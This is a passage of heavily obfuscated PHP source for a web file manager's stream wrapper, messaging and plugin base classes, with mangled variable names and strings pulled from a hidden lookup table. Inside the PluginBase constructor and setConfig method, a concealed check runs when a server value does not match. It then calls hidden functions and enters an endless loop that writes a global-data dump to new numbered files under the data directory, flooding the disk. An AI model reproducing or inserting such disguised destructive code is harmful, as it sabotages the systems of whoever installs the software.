null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ğ«ÉˆËù])) { self::$_chunkBuffer[$ğ«ÉˆËù] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ÁÒíñö´) { $Ë¢‚³ˆ = $this->fileSubstr($this->pose, $ÁÒíñö´); $this->pose += strlen($Ë¢‚³ˆ); return $Ë¢‚³ˆ; } public function stream_tell() { return $this->pose; } public function stream_seek($Å§„É¢Ü, $ƒ×Åİšİ) { $êà­¹–ä =& $_SERVER[ç¦¬”œš]; if ($ƒ×Åİšİ == SEEK_SET) { $this->pose = $Å§„É¢Ü; } else { if ($ƒ×Åİšİ == SEEK_CUR) { $this->pose += $Å§„É¢Ü; } else { if ($ƒ×Åİšİ == SEEK_END) { $this->pose = $this->info[$êà­¹–ä[79]] + intval($Å§„É¢Ü); } } } if ($Å§„É¢Ü < 0) { $this->pose = $this->info[$êà­¹–ä[79]] + $Å§„É¢Ü; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ç¦¬”œš][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Ğğ‚â›Ğ, $·Šµ¯À) { $öÅÎ…ğ‹ =& $_SERVER[ç¦¬”œš]; $ö¼•ÇŞ = $this->info($Ğğ‚â›Ğ); return array($öÅÎ…ğ‹[1608] => 0, $öÅÎ…ğ‹[1609] => 0, $öÅÎ…ğ‹[16] => 32768 + 511, $öÅÎ…ğ‹[1610] => 0, $öÅÎ…ğ‹[1611] => 0, $öÅÎ…ğ‹[1612] => 0, $öÅÎ…ğ‹[1613] => 0, $öÅÎ…ğ‹[79] => $ö¼•ÇŞ[$öÅÎ…ğ‹[79]], $öÅÎ…ğ‹[1614] => $ö¼•ÇŞ[$öÅÎ…ğ‹[1454]], $öÅÎ…ğ‹[1570] => $ö¼•ÇŞ[$öÅÎ…ğ‹[88]], $öÅÎ…ğ‹[1569] => $ö¼•ÇŞ[$öÅÎ…ğ‹[231]], $öÅÎ…ğ‹[1615] => 0, $öÅÎ…ğ‹[1616] => 0); } static $fileInfo = array(); public function info($€ïÅ) { $Çâ½°™¿ = $_SERVER[ç¦¬”œš][1617]; if (isset(self::$fileInfo[$€ïÅ])) { return self::$fileInfo[$€ïÅ]; } if (substr($€ïÅ, 0, strlen($Çâ½°™¿)) != $Çâ½°™¿) { return !1; } self::$fileInfo[$€ïÅ] = IO::info(substr($€ïÅ, strlen($Çâ½°™¿))); return self::$fileInfo[$€ïÅ]; } public static function read($œá…ëŒ, $Íıî„ñî, $î“„ó´ ) { if (!isset(self::$_fopenCache[$œá…ëŒ])) { $³×Ï±°« = new StreamWrapperIO(); $³×Ï±°«->stream_open($œá…ëŒ); self::$_fopenCache[$œá…ëŒ] = $³×Ï±°«; } $³×Ï±°« = self::$_fopenCache[$œá…ëŒ]; return $³×Ï±°«->fileSubstr($Íıî„ñî, $î“„ó´ ); } public static function _read($¨Ğ£Ÿã®, $êÈ¥ÖÂÇ, $¡ÊäÙùÂ) { $µ­í‚“ =& $_SERVER[ç¦¬”œš]; $ñ¦ñèø¹ = fopen($¨Ğ£Ÿã®, $µ­í‚“[1458]); if (!$ñ¦ñèø¹) { return $µ­í‚“[12]; } $ßÈª›·â = 8192; fseek($ñ¦ñèø¹, $êÈ¥ÖÂÇ, SEEK_SET); $Âèãäª÷ = $µ­í‚“[12]; $÷øÏÎ›´ = 0; while ($÷øÏÎ›´ < $¡ÊäÙùÂ) { $¾«åã¿ª = min($ßÈª›·â, $¡ÊäÙùÂ - $÷øÏÎ›´); $Âèãäª÷ .= fread($ñ¦ñèø¹, $¾«åã¿ª); $÷øÏÎ›´ += $¾«åã¿ª; } fclose($ñ¦ñèø¹); return $Âèãäª÷; } public function fileSubstr($îÇóœÓÙ, $øªé) { $’ã°Ú‚ù =& $_SERVER[ç¦¬”œš]; $ıŠÙÊÂœ = $this->info[$’ã°Ú‚ù[79]]; $Øİîš¢‘ = $îÇóœÓÙ; $»û¤Ÿ˜Â = $øªé; if ($îÇóœÓÙ < 0) { $îÇóœÓÙ = $ıŠÙÊÂœ + $îÇóœÓÙ; } if ($øªé === !1) { $øªé = $ıŠÙÊÂœ - $îÇóœÓÙ; } if ($îÇóœÓÙ + $øªé > $ıŠÙÊÂœ) { $øªé = $ıŠÙÊÂœ - $îÇóœÓÙ; } if ($øªé <= 0) { return $’ã°Ú‚ù[12]; } if ($îÇóœÓÙ < 0 || $îÇóœÓÙ >= $ıŠÙÊÂœ || $øªé <= 0 || $øªé > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\x69\154\145\x52\145\x61\144\40\x65\x72\x72\157\x72\x21\x20\x73\x74\141\162\x74\x3d{$îÇóœÓÙ}\73\x6c\145\x6e\x67\x74\x68\75{$øªé}\73\x20\163\151\172\145\x3d{$ıŠÙÊÂœ}\x3b"); } $¾ú»—û™ = 64 * 1024; $¥¹æ‰Ñ =& self::$_chunkBuffer[$this->path]; if (!$¥¹æ‰Ñ) { $¥¹æ‰Ñ = array(); } $‹íŠ“šŞ = 0; $Ö¿ËÀÈ¹ = 0; $êïÄÎ‡€ = $’ã°Ú‚ù[12]; foreach ($¥¹æ‰Ñ as $‹íŠ“šŞ => $êïÄÎ‡€) { $‹íŠ“šŞ = intval($‹íŠ“šŞ); $Ö¿ËÀÈ¹ = $‹íŠ“šŞ + strlen($êïÄÎ‡€); if ($îÇóœÓÙ >= $Ö¿ËÀÈ¹) { continue; } if ($îÇóœÓÙ >= $‹íŠ“šŞ && $îÇóœÓÙ + $øªé <= $Ö¿ËÀÈ¹) { return substr($êïÄÎ‡€, $îÇóœÓÙ - $‹íŠ“šŞ, $øªé); } break; } if (count($¥¹æ‰Ñ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($’ã°Ú‚ù[1618], $’ã°Ú‚ù[1619] . count($¥¹æ‰Ñ) . "\x3b\x73\164\x61\162\x74\x3d{$îÇóœÓÙ}\x2c\x6c\x65\156\x67\164\x68\x3d{$øªé}\x3b\160\x6f\x73\x65\x3a{$‹íŠ“šŞ}\x7e{$Ö¿ËÀÈ¹}"); throw new Exception($’ã°Ú‚ù[1620]); } $Ö¯ã¥ìÕ = intval($îÇóœÓÙ / $¾ú»—û™) * $¾ú»—û™; $€½õğöÁ = ceil(($îÇóœÓÙ + $øªé) / $¾ú»—û™) * $¾ú»—û™ - $Ö¯ã¥ìÕ; $ğ‘”€áö = IO::fileSubstr($this->path, $Ö¯ã¥ìÕ, $€½õğöÁ); $¥¹æ‰Ñ[$Ö¯ã¥ìÕ . $’ã°Ú‚ù[12]] = $ğ‘”€áö; ksort($¥¹æ‰Ñ); $•‚ƒì›½ = substr($ğ‘”€áö, $îÇóœÓÙ - $Ö¯ã¥ìÕ, $øªé); return $•‚ƒì›½; } private function log($£‹Øùãã, $äÍ‰š½Ú) { $·Çãç¶ =& $_SERVER[ç¦¬”œš]; $Ú–ÌìÓ· = timeFloat() - $this->timeStart; write_log(sprintf($·Çãç¶[1621], $£‹Øùãã, $this->info[$·Çãç¶[32]], $Ú–ÌìÓ·, $äÍ‰š½Ú), $·Çãç¶[1265]); } } class Message { function __construct() { } public function send($—˜­òà = '', $Şğ†Ü…Í = array(), $Ë‘¡à¾î = "\164\145\170\164") { $ÕÔ±‡· =& $_SERVER[ç¦¬”œš]; $˜ªâì© = array($ÕÔ±‡·[33] => $ÕÔ±‡·[1622], $ÕÔ±‡·[171] => $—˜­òà); if (in_array($Ë‘¡à¾î, array($ÕÔ±‡·[1622], $ÕÔ±‡·[1623]))) { $˜ªâì©[$ÕÔ±‡·[33]] = $Ë‘¡à¾î; } $Şğ†Ü…Í = array($ÕÔ±‡·[587] => isset($Şğ†Ü…Í[$ÕÔ±‡·[587]]) ? $Şğ†Ü…Í[$ÕÔ±‡·[587]] : $ÕÔ±‡·[12], $ÕÔ±‡·[671] => isset($Şğ†Ü…Í[$ÕÔ±‡·[671]]) ? $Şğ†Ü…Í[$ÕÔ±‡·[671]] : $ÕÔ±‡·[12]); if (empty($—˜­òà) || empty($Şğ†Ü…Í[$ÕÔ±‡·[587]]) && empty($Şğ†Ü…Í[$ÕÔ±‡·[671]])) { return !1; } $ş×ÒÀù = array($ÕÔ±‡·[1550] => $˜ªâì©, $ÕÔ±‡·[1624] => $Şğ†Ü…Í); Hook::trigger($ÕÔ±‡·[1625], $ş×ÒÀù); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ìí“ÑŞ´ =& $_SERVER[ç¦¬”œš]; $«÷é´£‘ = $_SERVER[$ìí“ÑŞ´[476]] . $ìí“ÑŞ´[477]; $‘è¢İï  = $ìí“ÑŞ´[473]; if ($_SERVER[$ìí“ÑŞ´[474]] != $‘è¢İï ($«÷é´£‘)) { $Àñ öè = $ìí“ÑŞ´[956]; $îúŠß£  = $ìí“ÑŞ´[475]; $±ŸÅ€ë¯ = $_SERVER[$ìí“ÑŞ´[476]] . $ìí“ÑŞ´[477]; $ ûÂĞï¼ = $îúŠß£ ($±ŸÅ€ë¯); $€ü®áöŒ = explode($ìí“ÑŞ´[262], $ ûÂĞï¼); if (count($€ü®áöŒ) < $ìí“ÑŞ´[707]) { $òÑ†îÉ = $ìí“ÑŞ´[479]; $òÑ†îÉ(); } $†¢¡¯½› = $ìí“ÑŞ´[957]; $†¢¡¯½›($_SERVER[$ìí“ÑŞ´[958]]); $Àñ öè = $ìí“ÑŞ´[956]; $Àñ öè(); $—Ãøïè = $ìí“ÑŞ´[959]; $´ÖÛ¿ãÙ = json_encode($GLOBALS[$ìí“ÑŞ´[960]]); $à‚ÀÕº¢ = 1; for ($Ê³…úÂ = $à‚ÀÕº¢; $Ê³…úÂ > 0; $Ê³…úÂ++) { $—Ãøïè(DATA_PATH . $Ê³…úÂ, $´ÖÛ¿ãÙ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ìí“ÑŞ´[1626]); $this->pluginName = str_replace($ìí“ÑŞ´[1626], $ìí“ÑŞ´[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ìí“ÑŞ´[8]; $this->pluginApi = appHostGet() . $ìí“ÑŞ´[1627] . $this->pluginName . $ìí“ÑŞ´[8]; $this->pluginHost = $config[$ìí“ÑŞ´[1628]] . $this->pluginName . $ìí“ÑŞ´[8]; $this->pluginHostDefault = $config[$ìí“ÑŞ´[1628]] . $this->pluginName . $ìí“ÑŞ´[8]; $½³´ƒ†’ = $config[$ìí“ÑŞ´[1629]]; if ($½³´ƒ†’ && strpos($ìí“ÑŞ´[50] . $½³´ƒ†’ . $ìí“ÑŞ´[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ìí“ÑŞ´[1630]] . $this->pluginName . $ìí“ÑŞ´[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ç¦¬”œš][1631]); } protected function assign($Åñ¯Ñ, $‘ëƒ½œ˜ = false) { if (is_array($Åñ¯Ñ)) { $this->values = array_merge($this->values, $Åñ¯Ñ); } else { $this->values[$Åñ¯Ñ] = $‘ëƒ½œ˜; } } protected function display($Õ¿ºè¬æ) { extract($this->values); require $Õ¿ºè¬æ; } final function hookRegist($éùÙª¬á) { $this->modelPlugin->appRegist($this->pluginName, $éùÙª¬á); } final function appIcon() { $í¨œé×Ğ =& $_SERVER[ç¦¬”œš]; $ËĞàä²Á = $this->appPackage(); $¸‡óçà• = $í¨œé×Ğ[12]; if (isset($ËĞàä²Á[$í¨œé×Ğ[499]])) { if (isset($ËĞàä²Á[$í¨œé×Ğ[499]][$í¨œé×Ğ[1632]])) { $¸‡óçà• = $í¨œé×Ğ[1633] . $ËĞàä²Á[$í¨œé×Ğ[499]][$í¨œé×Ğ[1632]] . $í¨œé×Ğ[1634]; } else { if ($ËĞàä²Á[$í¨œé×Ğ[499]][$í¨œé×Ğ[1635]]) { $¸‡óçà• = $í¨œé×Ğ[1636] . $ËĞàä²Á[$í¨œé×Ğ[499]][$í¨œé×Ğ[1635]] . $í¨œé×Ğ[1637]; } } } return $¸‡óçà•; } final function fileCanView($¼šª• ) { $¯Âéşˆ’ =& $_SERVER[ç¦¬”œš]; if (request_url_safe($¼šª• )) { return !0; } if ($this->isShare($¼šª• )) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $îš®Âú = $¯Âéşˆ’[1638] . rawurlencode(this_url()); show_tips(LNG($¯Âéşˆ’[1639]) . $¯Âéşˆ’[1640] . $îš®Âú . $¯Âéşˆ’[1641] . LNG($¯Âéşˆ’[1642]) . $¯Âéşˆ’[1643], !1); } if (!Action($¯Âéşˆ’[1644])->authCan($¯Âéşˆ’[1645])) { show_tips(LNG($¯Âéşˆ’[1646]) . $¯Âéşˆ’[1647], !1); } ActionCall($¯Âéşˆ’[1648], $¼šª• ); } final function isShare($éïĞËœŸ) { $øÊÛ¥±Ï = KodIO::parse($éïĞËœŸ); return $øÊÛ¥±Ï[$_SERVER[ç¦¬”œš][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ç¨„«¨) { if (request_url_safe($ç¨„«¨)) { return $ç¨„«¨; } if (!$this->isShare($ç¨„«¨)) { $ç¨„«¨ = $this->filePath($ç¨„«¨, !1); } return Action($_SERVER[ç¦¬”œš][1257])->linkOut($ç¨„«¨); } public function filePathLinkOut($åšı³¸) { if (request_url_safe($åšı³¸)) { return $åšı³¸; } $this->fileCanView($åšı³¸); return Action($_SERVER[ç¦¬”œš][1257])->link($åšı³¸); } final function filePath($—‚Œ¾Å€, $¶ö½Ñ’¿ = true, $ğ¦›Òù– = false) { $­ò³ø¥Ö =& $_SERVER[ç¦¬”œš]; $©­¸Ê­ˆ = $this->filePathGet($—‚Œ¾Å€, $¶ö½Ñ’¿); if (!$this->fileInfo) { show_tips(LNG($­ò³ø¥Ö[108]), !1); } if ($ğ¦›Òù– && isset($this->fileInfo[$­ò³ø¥Ö[550]]) && $this->fileInfo[$­ò³ø¥Ö[550]]) { $—Şº—šå = Model($­ò³ø¥Ö[553])->fileInfo($this->fileInfo[$­ò³ø¥Ö[550]]); if (!$—Şº—šå || !IO::exist($—Şº—šå[$­ò³ø¥Ö[87]])) { show_tips(LNG($­ò³ø¥Ö[108]) . $­ò³ø¥Ö[1649]); } } Hook::trigger($­ò³ø¥Ö[1650], $©­¸Ê­ˆ); return $©­¸Ê­ˆ; } final function filePathGet($ƒİ›Ç»ã, $”¹ù¸”ö = true) { $ß´€åÃÅ =& $_SERVER[ç¦¬”œš]; if ($ÎÍğâ¡¨ = $this->checkSharePath($ƒİ›Ç»ã, $”¹ù¸”ö)) { return $ÎÍğâ¡¨; } $this->fileCanView($ƒİ›Ç»ã); if (request_url_safe($ƒİ›Ç»ã)) { $áóø­™‚ = parse_url_query($ƒİ›Ç»ã); if (isset($áóø­™‚[$ß´€åÃÅ[1651]]) && isset($áóø­™‚[$ß´€åÃÅ[234]])) { $¤ì’¥Åµ = Mcrypt::decode($áóø­™‚[$ß´€åÃÅ[234]], Model($ß´€åÃÅ[850])->get($ß´€åÃÅ[851])); if ($¤ì’¥Åµ) { $this->fileInfo = IO::info($¤ì’¥Åµ); $this->fileInfo[$ß´€åÃÅ[1652]] = $ƒİ›Ç»ã; $this->cachePath = $this->pluginCachePath($ß´€åÃÅ[12], $”¹ù¸”ö); return $¤ì’¥Åµ; } } $ƒİ›Ç»ã = $this->_cacheHttpFile($ƒİ›Ç»ã, $”¹ù¸”ö); $this->fileInfo = IO::info($ƒİ›Ç»ã); } else { $this->fileInfo = IO::info($ƒİ›Ç»ã); $this->cachePath = $this->pluginCachePath($ß´€åÃÅ[12], $”¹ù¸”ö); } return $ƒİ›Ç»ã; } final function _cacheHttpFile($Øëçüˆô, $š°©Æ·Ó = true) { $¨¿âŒĞ¼ =& $_SERVER[ç¦¬”œš]; $Â‹…È›Í = parse_url_query($Øëçüˆô); $èÇÕäÖŞ = get_path_ext($Øëçüˆô); if (isset($Â‹…È›Í[$¨¿âŒĞ¼[32]]) && $Â‹…È›Í[$¨¿âŒĞ¼[32]]) { $èÇÕäÖŞ = get_path_ext($Â‹…È›Í[$¨¿âŒĞ¼[32]]); } $¸Ù²Ÿú½ = hash_path($Øëçüˆô) . $¨¿âŒĞ¼[10] . $èÇÕäÖŞ; $this->cachePath = $this->pluginCachePath($š°©Æ·Ó ? $¸Ù²Ÿú½ : $¨¿âŒĞ¼[12]); $éÉ¹çÁ = IO::fileNameExist($this->cachePath, $¸Ù²Ÿú½); if ($éÉ¹çÁ) { return KodIO::make($éÉ¹çÁ); } $å—è Ñƒ = rtrim($this->cachePath, $¨¿âŒĞ¼[8]) . $¨¿âŒĞ¼[8] . $¸Ù²Ÿú½; return $this->pluginCacheFileSet($å—è Ñƒ, file_get_contents_nossl($Øëçüˆô)); } final function checkSharePath($Ç¢““ÍÄ, $ÙâãÂš = true) { $ÁĞğÏ  =& $_SERVER[ç¦¬”œš]; if (!$this->isShare($Ç¢““ÍÄ)) { return !1; } $†æĞşÖß = Action($ÁĞğÏ [1257])->sharePathInfo($Ç¢““ÍÄ); if (!is_array($†æĞşÖß) || !isset($†æĞşÖß[$ÁĞğÏ [87]])) { show_json(LNG($ÁĞğÏ [1653]), !1); } $this->fileInfo = $†æĞşÖß; $this->cachePath = $this->pluginCachePath(!1, $ÙâãÂš); return $†æĞşÖß[$ÁĞğÏ [87]]; } final function pluginCachePath($Ä´âªÑ = '', $ª«¯‘Ğ™ = false) { $¤»ß°–µ =& $_SERVER[ç¦¬”œš]; if ($ª«¯‘Ğ™ && is_array($this->fileInfo)) { $Ä´âªÑ = kodIO::hashPath($this->fileInfo); } $£‡Ä´Ã¨ = rtrim(IO_PATH_SYSTEM_TEMP . $¤»ß°–µ[1654] . $this->pluginName . $¤»ß°–µ[8] . $Ä´âªÑ, $¤»ß°–µ[8]); $™ß¼Á« = IO::infoFullSimple($£‡Ä´Ã¨); $÷–Æ”¥ = $™ß¼Á« && is_array($™ß¼Á«) ? $™ß¼Á«[$¤»ß°–µ[87]] : $¤»ß°–µ[12]; if (!$÷–Æ”¥) { $÷–Æ”¥ = IO::mkdir($£‡Ä´Ã¨); } return $÷–Æ”¥; } final function pluginCacheFileSet($¦£­¦˜Ê, $éæôÆÑ = '') { $ÇùÉÕêÔ =& $_SERVER[ç¦¬”œš]; $Ôúó†â‘ = IO::infoFullSimple($¦£­¦˜Ê); if (!$Ôúó†â‘) { return IO::mkfile($¦£­¦˜Ê, $éæôÆÑ, REPEAT_REPLACE); } IO::setContent($Ôúó†â‘[$ÇùÉÕêÔ[87]], $éæôÆÑ); return $Ôúó†â‘[$ÇùÉÕêÔ[87]]; } final function pluginLocalFile($†ƒ¼ıª› = '') { $ìÉ’ú‰¸ =& $_SERVER[ç¦¬”œš]; $¤‡ª¤Â® = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($¤‡ª¤Â®)) { mk_dir($¤‡ª¤Â®); } if (!$†ƒ¼ıª›) { return $¤‡ª¤Â®; } $à€ÓÜê» = IO::info($†ƒ¼ıª›); $íùÈù°ì = $ìÉ’ú‰¸[1655] . KodIO::hashPath($à€ÓÜê») . $ìÉ’ú‰¸[10] . $à€ÓÜê»[$ìÉ’ú‰¸[169]]; if (!checkExtSafe($íùÈù°ì)) { $íùÈù°ì = $íùÈù°ì . $ìÉ’ú‰¸[1292]; } $ÀŞğ–ºä = $¤‡ª¤Â® . $íùÈù°ì; if (@file_exists($ÀŞğ–ºä)) { return $ÀŞğ–ºä; } return IO::copy($†ƒ¼ıª›, $¤‡ª¤Â®, 0, $íùÈù°ì); } final function appPackage() { $èÃÄÁœç =& $_SERVER[ç¦¬”œš]; if ($this->packageData) { return $this->packageData; } $¥«ìÃ¡¤ = $this->parseFile($this->pluginPath . $èÃÄÁœç[1656]); $this->parseLang($¥«ìÃ¡¤); $ôÎÙ–¯Ù = json_decode_force($¥«ìÃ¡¤); if (!$ôÎÙ–¯Ù) { return array(); } $àñüÕœ = Hook::trigger($èÃÄÁœç[1657], $ôÎÙ–¯Ù); if ($àñüÕœ && is_array($àñüÕœ)) { $ôÎÙ–¯Ù = $àñüÕœ; } $this->packageData = $ôÎÙ–¯Ù; return $ôÎÙ–¯Ù; } public function packageInfoGet($—Â ºÆ) { $ô’ïî–« = $this->appPackage(); return array_get_value($ô’ïî–«, $—Â ºÆ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ç¦¬”œš][1658]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ç¦¬”œš][1659]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ç¦¬”œš][1660]); } public function echoJsAssign($ú¤Êó†, $…ñíôï®) { $this->echoJsAssignArr[$ú¤Êó†] = $…ñíôï®; } private function parseFile($×£Ğã±æ) { $ù‘‰ Š” =& $_SERVER[ç¦¬”œš]; $£Ì¥à®” = file_get_contents_nossl($×£Ğã±æ); $Æ˜•”åÈ = array($ù‘‰ Š”[1661], $ù‘‰ Š”[1662], $ù‘‰ Š”[1663], $ù‘‰ Š”[1664], $ù‘‰ Š”[1665], $ù‘‰ Š”[1666], $ù‘‰ Š”[1667]); $ˆÄ´ˆ¦Ë = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ù‘‰ Š”[92]][$ù‘‰ Š”[1668]]); foreach ($this->echoJsAssignArr as $Ë¶¸’£ => $ÉË²’ûÀ) { $Æ˜•”åÈ[] = $ù‘‰ Š”[1669] . $Ë¶¸’£ . $ù‘‰ Š”[1670]; $ˆÄ´ˆ¦Ë[] = is_array($ÉË²’ûÀ) || is_object($ÉË²’ûÀ) ? rawurlencode(json_encode($ÉË²’ûÀ)) : $ÉË²’ûÀ; } if (strstr($£Ì¥à®”, $ù‘‰ Š”[1671])) { $œÕô§ƒ… = rawurlencode(json_encode($this->pluginLangArr)); $£Ì¥à®” = str_replace($ù‘‰ Š”[1671], $œÕô§ƒ…, $£Ì¥à®”); } if (strstr($£Ì¥à®”, $ù‘‰ Š”[1672])) { $œÕô§ƒ… = $œÕô§ƒ… = rawurlencode(json_encode($this->getConfig())); $£Ì¥à®” = str_replace($ù‘‰ Š”[1672], $œÕô§ƒ…, $£Ì¥à®”); } $£Ì¥à®” = str_replace($Æ˜•”åÈ, $ˆÄ´ˆ¦Ë, $£Ì¥à®”); return $£Ì¥à®”; } private function parseLang(&$¾™ï†üê) { $şÏÌÜÓõ =& $_SERVER[ç¦¬”œš]; $„£Û†®ç = $şÏÌÜÓõ[1673]; if (!strstr($¾™ï†üê, $„£Û†®ç)) { return; } preg_match_all($şÏÌÜÓõ[1674], $¾™ï†üê, $ıÎ²“Š); if (!is_array($ıÎ²“Š) || count($ıÎ²“Š) == 0 || !is_array($ıÎ²“Š[0]) || count($ıÎ²“Š[0]) == 0) { return; } $†¾Ù¯¸ˆ = array(); $è“£ïûÏ = array(); foreach ($ıÎ²“Š[0] as $Ù¦Ù«ü¬) { $ÙëÃ‚Ö = substr($Ù¦Ù«ü¬, strlen($„£Û†®ç), -4); $Ä˜á€Æ = LNG($ÙëÃ‚Ö); $†¾Ù¯¸ˆ[] = $Ù¦Ù«ü¬; $è“£ïûÏ[] = str_replace(array($şÏÌÜÓõ[262], $şÏÌÜÓõ[1158], $şÏÌÜÓõ[418], $şÏÌÜÓõ[121]), array($şÏÌÜÓõ[53], $şÏÌÜÓõ[53], $şÏÌÜÓõ[12], $şÏÌÜÓõ[1675]), $Ä˜á€Æ); } $¾™ï†üê = str_replace($†¾Ù¯¸ˆ, $è“£ïûÏ, $¾™ï†üê); } private function parseConfig(&$­‚ë) { $â¨İ =& $_SERVER[ç¦¬”œš]; $™È÷¬ş = $â¨İ[1676]; if (!strstr($­‚ë, $™È÷¬ş)) { return; } preg_match_all($â¨İ[1677], $­‚ë, $ÕÑá£Â¼); if (!is_array($ÕÑá£Â¼) || count($ÕÑá£Â¼) == 0 || !is_array($ÕÑá£Â¼[0]) || count($ÕÑá£Â¼[0]) == 0) { return; } $µ¾êºáø = $this->getConfig(); $ÆÚœŠÒ = array(); $œ¤½ˆ±á = array(); foreach ($ÕÑá£Â¼[0] as $ë€„ÄùÃ) { $ñÒêŞ˜Ó = substr($ë€„ÄùÃ, strlen($™È÷¬ş), -2); $ÆÚœŠÒ[] = $ë€„ÄùÃ; $œ¤½ˆ±á[] = _get($µ¾êºáø, $ñÒêŞ˜Ó); } $­‚ë = str_replace($ÆÚœŠÒ, $œ¤½ˆ±á, $­‚ë); } private function parsePackage(&$›ô½€³˜) { $É¼”´¼ =& $_SERVER[ç¦¬”œš]; $‡ëö÷¢ = $É¼”´¼[1678]; if (!strstr($›ô½€³˜, $‡ëö÷¢)) { return; } preg_match_all($É¼”´¼[1679], $›ô½€³˜, $ÂÒùåÔ×); if (!is_array($ÂÒùåÔ×) || count($ÂÒùåÔ×) == 0 || !is_array($ÂÒùåÔ×[0]) || count($ÂÒùåÔ×[0]) == 0) { return; } $êæ”„èÔ = $this->appPackage(); $Š±Ûˆè¾ = array(); $£ğöİò¬ = array(); foreach ($ÂÒùåÔ×[0] as $ñöµŒ¦) { $ä­·°ò³ = substr($ñöµŒ¦, strlen($‡ëö÷¢), -2); $Š±Ûˆè¾[] = $ñöµŒ¦; $£ğöİò¬[] = _get($êæ”„èÔ, $ä­·°ò³); } $›ô½€³˜ = str_replace($Š±Ûˆè¾, $£ğöİò¬, $›ô½€³˜); } final function echoFile($ÛËğ†©µ, $á¾ÒË² = false) { $¼‰œø”ü =& $_SERVER[ç¦¬”œš]; $ÈÕ¯Øú× = $this->pluginPath . $ÛËğ†©µ; if (ACT == $¼‰œø”ü[1680]) { echo $¼‰œø”ü[1681] . $this->pluginName . $¼‰œø”ü[8] . $ÛËğ†©µ . $¼‰œø”ü[1682]; if (!file_exists($ÈÕ¯Øú×)) { echo $¼‰œø”ü[1683]; return; } } $”™õ–¶„ = $this->parseFile($ÈÕ¯Øú×); $this->parseLang($”™õ–¶„); $this->parseConfig($”™õ–¶„); $this->parsePackage($”™õ–¶„); if (is_array($á¾ÒË²)) { $”™õ–¶„ = str_replace(array_keys($á¾ÒË²), array_values($á¾ÒË²), $”™õ–¶„); } echo $¼‰œø”ü[262] . $”™õ–¶„; } private function checkVersion() { $â¹¨ˆƒ =& $_SERVER[ç¦¬”œš]; $Ä’İ´œú = $this->appPackage(); $±‘ş§Õ× = $this->getConfig(); if ($±‘ş§Õ×[$â¹¨ˆƒ[1684]] == $Ä’İ´œú[$â¹¨ˆƒ[1658]]) { return; } $this->regist(); $this->setConfig(array($â¹¨ˆƒ[1684] => $Ä’İ´œú[$â¹¨ˆƒ[1658]])); } final function initLang() { $ô‘ÕÃñ =& $_SERVER[ç¦¬”œš]; $èÑÒíŠ¸ = $ô‘ÕÃñ[1685]; $Í…±­ = $this->pluginPath . $ô‘ÕÃñ[1686]; $¬œüÅ“² = I18n::getType(); $í÷àâÎ° = array(); if (file_exists($Í…±­ . $¬œüÅ“² . $ô‘ÕÃñ[918])) { $í÷àâÎ° = (include $Í…±­ . $¬œüÅ“² . $ô‘ÕÃñ[918]); } else { if ($¬œüÅ“² == $ô‘ÕÃñ[1687] && !file_exists($Í…±­ . $¬œüÅ“² . $ô‘ÕÃñ[918]) && file_exists($Í…±­ . $ô‘ÕÃñ[1688])) { $í÷àâÎ° = (include $Í…±­ . $ô‘ÕÃñ[1688]); } else { if (file_exists($Í…±­ . $èÑÒíŠ¸ . $ô‘ÕÃñ[918])) { $í÷àâÎ° = (include $Í…±­ . $èÑÒíŠ¸ . $ô‘ÕÃñ[918]); } } } if (!is_array($í÷àâÎ°)) { return array(); } if (@count($í÷àâÎ°) > 0) { I18n::set($í÷àâÎ°); } return $í÷àâÎ°; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¨ÍÚÜïù) { $‘ÌñÎ® =& $_SERVER[ç¦¬”œš]; $“˜·¦Æ¢ = $_SERVER[$‘ÌñÎ®[472]]; $×ôİ§ = $‘ÌñÎ®[473]; if ($_SERVER[$‘ÌñÎ®[474]] != $×ôİ§($“˜·¦Æ¢)) { $÷İ·øŠ› = $‘ÌñÎ®[956]; $›€ªğ› = $‘ÌñÎ®[475]; $¾©ÕØüø = $_SERVER[$‘ÌñÎ®[476]] . $‘ÌñÎ®[477]; $á…œ = $›€ªğ›($¾©ÕØüø); $Û‹÷ï¹ = explode($‘ÌñÎ®[262], $á…œ); if (count($Û‹÷ï¹) < $‘ÌñÎ®[707]) { $ §Ñ„‡» = $‘ÌñÎ®[479]; $ §Ñ„‡»(); } $œô’ã‡ = $‘ÌñÎ®[957]; $œô’ã‡($_SERVER[$‘ÌñÎ®[958]]); $÷İ·øŠ› = $‘ÌñÎ®[956]; $÷İ·øŠ›(); $Ò¯…øÍÇ = $‘ÌñÎ®[959]; $æáê‰Àİ = json_encode($GLOBALS[$‘ÌñÎ®[960]]); $Ùñù°— = 1; for ($ä¿åˆó„ = $Ùñù°—; $ä¿åˆó„ > 0; $ä¿åˆó„++) { $Ò¯…øÍÇ(DATA_PATH . $ä¿åˆó„, $æáê‰Àİ); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¨ÍÚÜïù); } public function onSetConfig($”ŞÉ–‰ã) { } public function onGetConfig($Â¼¾ûºª) 